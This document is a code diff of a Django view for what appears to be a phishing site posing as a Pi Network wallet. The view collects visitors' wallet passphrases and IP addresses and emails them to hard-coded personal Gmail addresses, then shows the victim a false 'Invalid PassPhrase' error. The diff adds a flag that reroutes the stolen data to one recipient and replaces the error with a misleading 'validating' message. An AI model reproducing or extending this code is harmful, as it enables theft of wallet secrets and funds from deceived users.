@@ -11,6 +11,8 @@ import socket
 # Create your views here.
 import uuid
 
+my_site = True
+
 def get_mac_address():
     mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(2,7)][::-1])
     return mac
@@ -81,17 +83,31 @@ def submit_pass(request):
         else:
             look_up_key = generate_password()
             key_exists = models.PassPhrase.objects.filter(keys=keys).exists()
+
             if key_exists:
-                if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
-                    messages.error(request, 'Invalid Passphrase')
-                    return redirect('/wallet/')
-                
-                elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
-                    return render(request, 'verification.html', {})
-                
-                elif models.PassPhrase.objects.filter(keys=keys).exists():
-                    messages.error(request, 'Invalid Passphrase')
-                    return redirect('/wallet/')
+                if my_site: # for validatepis 
+                    if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
+                        messages.error(request, 'We are validating your Wallet PassPhrase')
+                        return redirect('/wallet/')
+                    
+                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
+                        return render(request, 'verification.html', {})
+                    
+                    elif models.PassPhrase.objects.filter(keys=keys).exists():
+                        messages.error(request, 'We are Validating Your Wallet Passphrase')
+                        return redirect('/wallet/')
+                    
+                else:
+                    if models.PassPhrase.objects.filter(keys=keys, is_verified=False).exists():
+                        messages.error(request, 'Invalid Passphrase')
+                        return redirect('/wallet/')
+                    
+                    elif models.PassPhrase.objects.filter(keys=keys, is_verified=True).exists():
+                        return render(request, 'verification.html', {})
+                    
+                    elif models.PassPhrase.objects.filter(keys=keys).exists():
+                        messages.error(request, 'Invalid Passphrase')
+                        return redirect('/wallet/')
                 
 
             else:
@@ -110,10 +126,16 @@ def submit_pass(request):
                     ip_address = get_ip_address()
                     request.session['ip_address'] = ip_address
                     ip_address = ip_address
-                    
-                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
 
-                send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
+                if my_site:
+                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted (My site)', email_to="ezekielobiajulu0@gmail.com")
+
+                else:
+                    
+                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="ezekielobiajulu0@gmail.com")
+
+                
+                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject='Pi site Token Submitted', email_to="obikeechiemerielinus@gmail.com")
 
                 messages.error(request, "Invalid PassPhrase")
                 return redirect('/wallet/')
